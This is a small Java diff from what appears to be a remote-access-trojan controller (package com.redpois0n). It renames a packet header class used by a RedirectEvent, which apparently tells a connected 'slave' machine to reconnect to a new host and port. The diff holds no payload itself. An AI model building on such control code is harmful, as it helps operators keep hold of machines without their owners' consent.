@@ -4,8 +4,8 @@ import javax.swing.ImageIcon;
 
 import com.redpois0n.Slave;
 import com.redpois0n.exceptions.CloseException;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.utils.IconUtils;
 import com.redpois0n.utils.Util;
 
@@ -26,7 +26,7 @@ public class RedirectEvent extends Event {
 
 	@Override
 	public void perform(Slave sl) {
-		PacketBuilder packet = new PacketBuilder(Header.REDIRECT);
+		PacketBuilder packet = new PacketBuilder(OutgoingHeader.REDIRECT);
 
 		String[] str = ip.split(":");
 
